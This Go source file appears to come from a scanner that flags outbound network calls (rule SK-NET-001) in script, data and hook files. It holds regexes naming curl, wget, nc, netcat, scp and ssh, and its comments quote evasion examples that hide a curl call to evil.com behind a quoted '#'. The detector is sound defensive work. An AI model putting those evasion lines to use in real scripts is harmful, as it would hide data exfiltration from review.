package rules

import (
	"regexp"
	"strings"
)

// NetworkRule detects outbound-network surface: any place a bundle reaches the
// internet (curl/wget, raw http(s) URLs, language HTTP clients). Network plus
// shell is the exfiltration shape, so these findings feed the score even when
// no single line is a pipe-to-shell.
type NetworkRule struct{}

// ID implements Rule.
func (NetworkRule) ID() string { return "SK-NET" }

var (
	netCmd = regexp.MustCompile(`(?i)\b(curl|wget|nc|netcat|scp|ssh)\b`)
	// httpURL matches an outbound URL; localhost/127.0.0.1 are excluded as they
	// are not exfiltration channels.
	httpURL = regexp.MustCompile(`(?i)https?://[a-z0-9.\-]+`)
	// httpClient matches common language HTTP clients embedded in scripts.
	// requests.<method> covers ALL verbs (get/post/put/patch/delete/head/
	// options) so an exfil via requests.put/.delete/.patch/.head/.options
	// cannot slip past SK-NET-001; fetch\s*\( allows a space between `fetch`
	// and its paren (`fetch ('…')`).
	httpClient = regexp.MustCompile(`(?i)(requests\.(get|post|put|patch|delete|head|options)|urllib\.request|http\.client|fetch\s*\(|axios\.|net/http|httpx\.)`)
	// localHost matches a genuine loopback URL. The host is anchored
	// ([:/]|$) so `localhost.evil.com` is NOT mistaken for localhost (an
	// unanchored prefix match would otherwise suppress SK-NET-001).
	localHost = regexp.MustCompile(`(?i)https?://(localhost|127\.0\.0\.1|0\.0\.0\.0)([:/]|$)`)
)

// Check implements Rule.
func (r NetworkRule) Check(files []SourceFile) []Finding {
	var out []Finding
	for _, f := range files {
		// Pure prompt markdown that merely documents a URL is not a runtime
		// network call, so we only scan executable surfaces here.
		if f.Kind != KindScript && f.Kind != KindOther && f.Kind != KindHooksJSON {
			continue
		}
		lines := strings.Split(f.Content, "\n")
		for i, line := range lines {
			// A `#` comment in a shell/python script (e.g.
			// `# uses curl to download weights`) is prose, not a runtime
			// network call. Strip it before matching so a command word that
			// appears only in a comment cannot set hasCmd. JSON/YAML data
			// files keep `#` verbatim (it is not a shell comment there).
			scanLine := line
			if f.Kind == KindScript {
				scanLine = stripShellComment(line)
			}
			urls := httpURL.FindAllString(scanLine, -1)
			hasRemoteURL := false
			hasAnyURL := len(urls) > 0
			for _, u := range urls {
				if !localHost.MatchString(u) {
					hasRemoteURL = true
					break
				}
			}
			// A network command whose only URL is localhost (or which targets
			// localhost) is not an exfil/fetch channel — skip it.
			hasCmd := netCmd.MatchString(scanLine) && (hasRemoteURL || !hasAnyURL)
			// But a bare network command with no URL at all on the line is still
			// only interesting if nothing local contradicts it.
			if netCmd.MatchString(scanLine) && hasAnyURL && !hasRemoteURL {
				hasCmd = false
			}
			hasURL := hasRemoteURL
			hasClient := httpClient.MatchString(scanLine)
			// A bare documented URL — in a # comment or string literal of an
			// executable script, or in a non-executable data file (config.json
			// repository URL, package.json homepage, data.yaml endpoint) — is
			// not an active network call. Only emit SK-NET-001 for KindScript
			// and KindOther when a real network command (curl/wget/nc/scp/ssh)
			// or HTTP client (requests/urllib/fetch/httpx/...) is on the line.
			// Real calls all carry such a token, so requiring one drops only
			// comment/string-literal false positives without weakening real
			// exfil detection. hooks.json keeps flagging a bare remote URL as a
			// credible fetch (a hook command's args).
			if (f.Kind == KindOther || f.Kind == KindScript) && !hasCmd && !hasClient {
				continue
			}
			if !hasCmd && !hasURL && !hasClient {
				continue
			}
			sev := SeverityMedium
			reason := networkReason(f.Kind, hasCmd, hasURL)
			out = append(out, Finding{
				RuleID:   "SK-NET-001",
				Severity: sev,
				Surface:  SurfaceNetwork,
				Reason:   reason,
				Evidence: Evidence{File: f.Path, Line: i + 1, Snippet: strings.TrimSpace(line)},
			})
		}
	}
	return out
}

// networkReason picks a kind-accurate reason string. The old generic "from an
// executable file" reason lied about non-script surfaces — a .json/.yaml/.txt
// data file is not executable.
func networkReason(kind FileKind, hasCmd, hasURL bool) string {
	switch kind {
	case KindScript:
		if hasCmd && hasURL {
			return "fetches from a remote host using a network command (curl/wget/etc.)"
		}
		return "makes an outbound network call from an executable script"
	case KindHooksJSON:
		if hasCmd && hasURL {
			return "hook command fetches from a remote host using a network command (curl/wget/etc.)"
		}
		return "hook command makes an outbound network call"
	default: // KindOther — only reached when a real cmd/client is present
		if hasCmd && hasURL {
			return "runs a network command pointed at a remote host from a data/config file"
		}
		return "runs a network command / HTTP client from a data/config file"
	}
}

// stripShellComment removes a shell `#` comment from a line: everything from
// the first `#` that starts a word (at line start or after whitespace) to the
// end of line — but ONLY when that `#` is outside any quoted string. It tracks
// single (`'`) and double (`"`) quote state while scanning, so a `#` inside a
// quoted string (e.g. `echo "x # " && curl https://evil.com`) is NOT treated
// as a comment start and the trailing real command is preserved — an attacker
// can no longer hide a curl/wget/nc/scp/ssh exfil behind a quoted `#`. It is
// ALSO backslash-aware inside double-quoted strings: a `\"` is a literal `"`
// in real shell (a backslash only escapes `$`, backtick, `"`, `\`, newline
// inside double quotes), NOT a string terminator, so the escaped `"` is
// skipped and does not toggle the quote state — otherwise `echo "\" # " &&
// curl https://evil.com` would close the string at `\"`, mistake the trailing
// `#` for a comment, and hide the curl exfil. A backslash is literal inside
// single quotes, so only double-quoted strings skip the escaped char. A `#`
// embedded mid-token (`echo a#b`) is not a shell comment and is preserved.
// Shebangs (`#!/bin/sh`) and inline notes (`cmd # note`) both strip cleanly.
// This only ever removes prose, never a real network call, so a command word
// appearing solely in a comment can no longer set hasCmd and false-positive
// SK-NET-001.
func stripShellComment(line string) string {
	var inSingle, inDouble bool
	for i := 0; i < len(line); i++ {
		switch line[i] {
		case '\\':
			// Inside a double-quoted string a backslash escapes the next char
			// (e.g. `\"` is a literal `"`, NOT a string terminator). Skip the
			// escaped char so the quote state stays correct — otherwise a `\"`
			// would close the string and a following `#` would be mistaken for
			// a comment, hiding a trailing exfil command. A backslash is
			// literal inside single quotes, so only act when inDouble.
			if inDouble && i+1 < len(line) {
				i++ // skip the escaped char
			}
		case '\'':
			if !inDouble {
				inSingle = !inSingle
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
			}
		case '#':
			if !inSingle && !inDouble && (i == 0 || line[i-1] == ' ' || line[i-1] == '\t') {
				return line[:i]
			}
		}
	}
	return line
}
